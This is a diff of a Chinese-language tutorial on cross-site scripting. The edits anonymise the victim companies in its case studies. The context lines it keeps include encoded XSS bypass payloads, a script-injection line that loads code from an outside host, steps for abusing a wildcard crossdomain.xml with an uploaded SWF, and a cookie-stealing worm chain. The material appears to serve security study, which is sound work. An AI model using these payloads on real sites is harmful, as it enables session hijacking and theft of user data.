@@ -56,7 +56,7 @@ XSS的本质是**信任边界的突破**：
    - User-Agent -> 访问统计
 
 2. **移动端/WAP同步**
-   - WAP页面提交 -> PC端展示（赶集网案例）
+   - WAP页面提交 -> PC端展示（某分类信息网站案例）
    - APP写入 -> Web端展示（融资城案例）
 
 3. **客户端-Web同步**
@@ -217,7 +217,7 @@ xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
 // Unicode编码绕过
 \u003ciframe\u002fonload\u003dalert(1)\u003e
 
-// 实战案例（联想论坛Flash XSS）
+// 实战案例（某电脑厂商论坛Flash XSS）
 https://example.com/[已脱敏]
 ```
 
@@ -360,7 +360,7 @@ var s=document.createElement('script');s.src='//x.com/x.js';document.body.append
 
 #### 4.6.1 Flash方式
 
-**实战案例（360云盘）**：
+**实战案例（某云盘）**：
 ```
 利用Flash接口获取用户信息，绕过httponly限制
 通过Flash调用JS接口实现cookie替代方案
@@ -468,17 +468,17 @@ navigateToURL(new URLRequest("javascript:alert(1)"));
 
 ### 6.2 crossdomain.xml利用
 
-**实战案例（某互联网公司邮箱）**：
+**实战案例（某邮箱服务）**：
 ```xml
 <cross-domain-policy>
-    <allow-access-from domain="*.某互联网公司.com"/>
+    <allow-access-from domain="*.某域名.com"/>
 </cross-domain-policy>
 ```
 
 利用思路：
-1. 在*.某互联网公司.com下找到可上传点（图片伪装SWF）
+1. 在*.某域名.com下找到可上传点（图片伪装SWF）
 2. 上传恶意SWF
-3. 通过Flash读取某互联网公司邮箱数据
+3. 通过Flash读取某邮箱服务数据
 
 ### 6.3 Flash XSS Rootkit
 
@@ -696,7 +696,7 @@ worm()
 
 ### 9.4 XSS -> 账号劫持 -> 权限提升
 
-**案例（某互联网公司空间蠕虫）**：
+**案例（某社交空间蠕虫）**：
 ```
 XSS触发 -> 获取skey -> 伪造Cookie ->
 自动发某社交平台 -> 自动加关注 -> 蠕虫传播
@@ -732,13 +732,13 @@ XSS触发 -> 获取skey -> 伪造Cookie ->
 
 | 漏洞类型 | 典型案例 | 关键技术点 |
 |---------|---------|-----------|
-| 存储型XSS | 赶集网、汽车之家、大街网 | 用户输入存储、多点触发 |
-| 反射型XSS | 开心网、交通银行、搜狐 | URL参数回显 |
+| 存储型XSS | 某分类信息网站、汽车之家、大街网 | 用户输入存储、多点触发 |
+| 反射型XSS | 开心网、某国有银行、某门户网站 | URL参数回显 |
 | DOM XSS | 某互联网公司document.domain、某社交平台Flash | 客户端代码执行 |
-| Flash XSS | 音悦台Rootkit、某互联网公司邮箱crossdomain | SWF安全配置 |
+| Flash XSS | 音悦台Rootkit、某邮箱服务crossdomain | SWF安全配置 |
 | mXSS | 某社交平台邮箱、某邮箱服务 | 浏览器解析差异 |
 | 盲打XSS | 成都公安、苏宁、快速问医生 | 后台触发 |
-| 蠕虫XSS | 大街网、某互联网公司空间 | 自动传播 |
+| 蠕虫XSS | 大街网、某社交空间 | 自动传播 |
 
 ---
 
